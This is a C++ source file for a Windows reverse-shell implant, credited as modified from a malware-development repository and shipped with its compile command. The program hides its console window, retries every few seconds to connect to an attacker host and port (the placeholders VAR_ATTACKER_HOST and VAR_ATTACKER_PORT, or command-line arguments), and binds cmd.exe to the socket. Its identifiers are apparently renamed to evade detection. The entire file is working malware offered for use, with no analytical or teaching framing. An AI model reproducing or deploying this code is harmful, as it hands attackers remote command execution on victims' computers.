// Modified
// Original: https://raw.githubusercontent.com/paranoidninja/ScriptDotSh-MalwareDevelopment/master/prometheus.cpp
// i686-w64-mingw32-g++ reverse2.cpp -o reverse2.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

#include <winsock2.h>
#include <windows.h>
#include <sstream>
#include <string.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024


void LaunchFreddy(char* place, int shipment) {
    while(true) {
        Sleep(5555);

        SOCKET myShipment;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        myShipment = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(place);
        addr.sin_port = htons(shipment);

        if (WSAConnect(myShipment, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
            closesocket(myShipment);
            WSACleanup();
            continue;
        }
        else {
            char incomingPleasures[DEFAULT_BUFLEN];
            memset(incomingPleasures, 0, sizeof(incomingPleasures));
            int RecvCode = recv(myShipment, incomingPleasures, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(myShipment);
                WSACleanup();
                continue;
            }
            else {
                LPTSTR szCMDPath = new TCHAR[255];
                GetEnvironmentVariable((LPCSTR)"COMSPEC", szCMDPath, 256);
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) myShipment;
                CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);
                memset(incomingPleasures, 0, sizeof(incomingPleasures));
                int RecvCode = recv(myShipment, incomingPleasures, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(myShipment);
                    WSACleanup();
                    continue;
                }
                if (strcmp(incomingPleasures, "exit\n") == 0) {
                    exit(0);
                }
            }
        }
    }
}


int main(int argc, char **argv) {
    FreeConsole();
    if (argc == 3) {
        int port  = atoi(argv[2]);
        LaunchFreddy(argv[1], port);
    }
    else {
        char host[] = "VAR_ATTACKER_HOST";
        int port = VAR_ATTACKER_PORT;
        LaunchFreddy(host, port);
    }
    return 0;
}
